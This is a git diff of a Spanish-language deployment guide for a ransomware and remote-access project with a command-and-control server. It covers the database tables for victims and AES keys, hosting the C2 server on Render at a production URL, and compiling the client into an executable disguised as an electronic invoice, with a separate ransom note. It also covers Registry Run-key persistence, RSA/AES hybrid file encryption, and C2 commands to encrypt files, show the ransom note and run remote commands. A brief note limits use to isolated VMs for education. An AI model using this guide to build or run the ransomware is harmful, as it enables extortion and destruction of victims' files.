@@ -1,6 +1,7 @@
 # 📦 Instrucciones de Despliegue e Instalación
 
 ## 1. Configuración de la Base de Datos (Supabase)
+
 Para persistencia de datos (víctimas, claves, archivos cifrados), usamos **Supabase** como base de datos PostgreSQL en la nube.
 
 ### Paso 1: Crear Proyecto en Supabase
@@ -36,6 +37,7 @@ CREATE TABLE keys (
   socket_id TEXT,
   hostname TEXT,
   aes_key TEXT,
+  encrypted_aes_key TEXT,  -- Clave AES cifrada con RSA (Base64)
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
@@ -51,6 +53,11 @@ CREATE TABLE encrypted_files (
   aes_key TEXT,
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
+
+-- Índices para mejor rendimiento
+CREATE INDEX idx_victims_uuid ON victims(uuid);
+CREATE INDEX idx_keys_uuid ON keys(uuid);
+CREATE INDEX idx_encrypted_files_uuid ON encrypted_files(uuid);
 ```
 
 ### Paso 3: Obtener Credenciales
@@ -61,95 +68,248 @@ CREATE TABLE encrypted_files (
 
 ---
 
-## 2. Instalación del Servidor (PC Atacante / Render)
+## 2. Instalación del Servidor
 
 ### Opción A: Render (Producción)
-1. Sube este código a tu repositorio de GitHub.
-2. Crea un nuevo **Web Service** en Render.com conectado a tu repo.
+
+1. Sube el código a tu repositorio de GitHub.
+2. Crea un nuevo **Web Service** en [Render.com](https://render.com) conectado a tu repo.
 3. En **Environment Variables** añade:
-   - `SUPABASE_URL`: La URL de tu proyecto
-   - `SUPABASE_KEY`: La clave anon/public
+   ```
+   SUPABASE_URL=https://tu-proyecto.supabase.co
+   SUPABASE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+   ```
 4. El autodespliegue se encargará del resto usando `render.yaml`.
 
-### Opción B: Local (Pruebas)
+**URL de producción**: `https://proyectoseguridad-pnzo.onrender.com`
+
+### Opción B: Local (Desarrollo/Pruebas)
+
 1. Crea un archivo `.env` en la raíz del proyecto:
-    ```
-    SUPABASE_URL=https://tu-proyecto.supabase.co
-    SUPABASE_KEY=tu-clave-anon-public
-    ```
+   ```env
+   SUPABASE_URL=https://tu-proyecto.supabase.co
+   SUPABASE_KEY=tu-clave-anon-public
+   PORT=3000
+   ```
+
 2. Instalar dependencias:
-    ```bash
-    npm install
-    ```
+   ```bash
+   npm install
+   ```
+
 3. Iniciar servidor:
-    ```bash
-    npm start
-    ```
+   ```bash
+   npm start
+   ```
+
+4. Acceder al dashboard: `http://localhost:3000`
 
 ---
 
-## 3. Compilación del Cliente (Malware)
+## 3. Estructura del Proyecto
+
+```
+C2/
+├── server.js              # Servidor C2 principal (Express + Socket.IO)
+├── cliente.js             # Cliente RAT (se compila a .exe)
+├── interfazdeaviso.py     # Nota de rescate (PyQt6)
+├── build.js               # Script de compilación automática
+├── render.yaml            # Configuración para Render.com
+├── package.json           # Dependencias Node.js
+├── .env                   # Variables de entorno (NO subir a Git)
+│
+├── public/                # Dashboard Web
+│   ├── index.html         # Panel principal
+│   ├── database.html      # Visualización de BD
+│   ├── consola.html       # Consola remota
+│   ├── css/               # Estilos
+│   └── js/                # JavaScript frontend
+│       ├── main.js        # Lógica del panel principal
+│       └── database.js    # Lógica de la pestaña BD
+│
+├── keys/                  # Almacén de claves RSA (NO subir a Git)
+│   ├── server_private.pem # Clave RSA privada del servidor
+│   ├── server_public.pem  # Clave RSA pública
+│   └── [hostname]_key.txt # Backups locales de claves AES
+│
+├── dist/                  # Ejecutables compilados
+│   └── Factura_Electronica_Enero2026.exe
+│
+└── docs/                  # Documentación
+    ├── MANUAL_OPERACIONES.md
+    ├── MANUAL_TECNICO.md
+    └── INSTRUCCIONES.md
+```
+
+---
+
+## 4. Compilación del Cliente (Malware)
 
 ### Requisitos Previos
-* Tener Node.js instalado.
-* Conocer la URL de tu servidor (ej. `https://mi-proyecto-c2.onrender.com`).
+* Node.js v18+ instalado
+* Python 3.10+ con PyInstaller (opcional, para nota de rescate)
+* Conocer la URL de tu servidor
 
 ### Pasos de Compilación
-1. Edita `cliente.js` y asegúrate de que tu URL esté en la lista `SERVERS`.
-2. Ejecuta el script de construcción automatizado:
-    ```bash
-    npm run build-client
-    ```
-3. El sistema generará automáticamente en la carpeta `dist/`:
-    * **Cliente (Malware)**: `Factura_Electronica_Enero2026.exe`
-    * **Nota de Rescate**: `Comprobante_Pago_2026.exe`
-    * **Recursos**: `escudo.png`, `adobe_icon.ico`
+
+1. **Editar servidor en cliente.js**:
+   ```javascript
+   const SERVERS = [
+     'https://tu-servidor.onrender.com',  // Producción
+     'http://localhost:3000'               // Desarrollo
+   ];
+   ```
+
+2. **Compilar ejecutable**:
+   ```bash
+   npm run build-client
+   ```
+
+3. **Salida en `dist/`**:
+   - `Factura_Electronica_Enero2026.exe` - Cliente principal
+   - `Comprobante_Pago_2026.exe` - Nota de rescate (si Python disponible)
+
+### Compilación Manual (alternativa)
+
+```bash
+# Instalar pkg globalmente
+npm install -g pkg
+
+# Compilar para Windows x64
+pkg cliente.js --targets node18-win-x64 --output dist/MiMalware.exe
+```
 
 ---
 
-## 4. Creación de SFX (Paquete Todo-en-Uno)
-Para distribuir cliente + nota + escudo en un solo archivo:
+## 5. Dashboard - Funcionalidades
 
-1. Ejecuta el CreadorSFX:
-    ```bash
-    python CreadorSFX.py
-    ```
-2. Selecciona los archivos a empaquetar:
-    - `Factura_Electronica_Enero2026.exe` (principal)
-    - `Comprobante_Pago_2026.exe`
-    - `escudo.png`
-3. El SFX extraerá todo y ejecutará solo el cliente principal.
+### Páginas Disponibles
+
+| Página | URL | Descripción |
+|--------|-----|-------------|
+| Panel Principal | `/` o `/index.html` | Control de clientes y ejecución de comandos |
+| Base de Datos | `/database.html` | Visualización de víctimas, claves y archivos |
+| Consola Remota | `/consola.html` | Terminal interactiva para comandos |
+| Gestión de Clientes | `/clientes.html` | Lista detallada de clientes |
+
+### Base de Datos (database.html)
+
+**4 pestañas disponibles:**
+
+1. **Víctimas**: Información del sistema infectado
+   - UUID, Hostname, Usuario, IP, Plataforma, Estado
+
+2. **Claves**: Claves AES de cada cliente
+   - Permite editar y eliminar claves
+   - Función de copiar al portapapeles
+
+3. **Archivos Cifrados**: Registro de archivos encriptados
+   - Nombre cifrado, original, directorio, IV
+
+4. **Claves RSA**: Par de claves del servidor
+   - Clave pública y privada en formato PEM
+   - Función de copiar
 
 ---
 
-## 5. Dashboard - Base de Datos
+## 6. Sistema de Cifrado Híbrido
 
-### Acceder a la Visualización de Datos
-1. Navega a `/database.html` en tu dashboard.
-2. Verás tres pestañas:
-   - **Víctimas**: Hostname, IP, SO, arquitectura, estado
-   - **Claves**: UUID, hostname, clave AES-256
-   - **Archivos Cifrados**: Nombre, directorio, IV
+### Flujo de Registro (Handshake)
 
-### Funcionalidades
-- **Filtros de cabecera**: Haz clic en las cabeceras para ordenar
-- **Búsqueda**: Usa el campo de filtro para buscar por cualquier valor
-- **Auto-refresh**: Los datos se actualizan cada 30 segundos
+```
+1. Cliente se conecta al servidor via Socket.IO
+2. Servidor emite 'rsa-handshake' con clave pública RSA
+3. Cliente genera clave AES-256 aleatoria localmente
+4. Cliente cifra la clave AES con RSA-OAEP-SHA256
+5. Cliente envía 'clave-aes-cliente' con la clave cifrada
+6. Servidor descifra con clave privada RSA
+7. Servidor guarda ambas versiones (plain + cifrada) en Supabase
+8. Servidor emite 'registrado' confirmando el handshake
+```
+
+### Algoritmos Utilizados
+
+| Propósito | Algoritmo | Detalles |
+|-----------|-----------|----------|
+| Intercambio de claves | RSA-2048-OAEP | SHA256 como función hash |
+| Cifrado de archivos | AES-256-CBC | IV único de 16 bytes por archivo |
+| Formato de claves | PEM | PKCS#8 (privada), SPKI (pública) |
 
 ---
 
-## 6. Infección (PC Víctima)
+## 7. Ejecución en la Víctima (VM de Pruebas)
 
-1. Envía el ejecutable `.exe` o SFX a la máquina objetivo (VM de pruebas).
-2. Al ejecutarse:
+⚠️ **ADVERTENCIA**: Solo ejecutar en máquinas virtuales aisladas para fines educativos.
+
+### Proceso de Infección
+
+1. Enviar el ejecutable `.exe` a la máquina objetivo
+2. Al ejecutarse, el malware:
    - Se copia a `%APPDATA%\AdobeReader\`
-   - Se registra en el inicio de Windows
+   - Se registra en el inicio de Windows (Registry Run Key)
    - Se conecta al servidor C2
+   - Genera y envía clave AES cifrada con RSA
+
 3. Desde el Dashboard puedes:
    - Ver información del sistema
-   - Escanear archivos
-   - Cifrar documentos
+   - Ejecutar comandos remotos
+   - Escanear archivos del sistema
+   - Cifrar documentos seleccionados
    - Mostrar nota de rescate
-   - Descifrar archivos
+   - Descifrar archivos (recuperación)
+
+### Comandos Disponibles
+
+```bash
+# Comandos especiales C2
+c2:scan                  # Listar archivos objetivo
+c2:encrypt 50            # Cifrar 50 archivos
+c2:encrypt-all 100       # Cifrar 100 archivos (cualquier tipo)
+c2:decrypt               # Descifrar todos los .cript
+c2:ransom                # Mostrar nota de rescate
+c2:kill                  # Eliminar persistencia
+
+# Comandos del sistema
+dir                      # Listar directorio
+whoami                   # Usuario actual
+systeminfo               # Info del sistema
+```
 
 ---
+
+## 8. Variables de Entorno Requeridas
+
+| Variable | Descripción | Ejemplo |
+|----------|-------------|---------|
+| `SUPABASE_URL` | URL del proyecto Supabase | `https://abc123.supabase.co` |
+| `SUPABASE_KEY` | Clave anon/public de Supabase | `eyJhbGciOiJIUzI1...` |
+| `PORT` | Puerto del servidor (opcional) | `3000` |
+
+---
+
+## 9. Solución de Problemas Comunes
+
+### "Cannot find module '@supabase/supabase-js'"
+```bash
+npm install @supabase/supabase-js
+```
+
+### "pkg: Targets not specified"
+```bash
+pkg cliente.js --targets node18-win-x64
+```
+
+### Cliente no conecta
+1. Verificar URL del servidor en `cliente.js`
+2. Confirmar que Render/servidor está activo
+3. Revisar firewall/antivirus
+
+### Base de datos vacía
+1. Verificar variables SUPABASE_URL y SUPABASE_KEY
+2. Confirmar tablas creadas en Supabase
+3. Revisar logs del servidor
+
+---
+
+**Última actualización**: 2026-01-13  
+**Versión**: 2.0.0
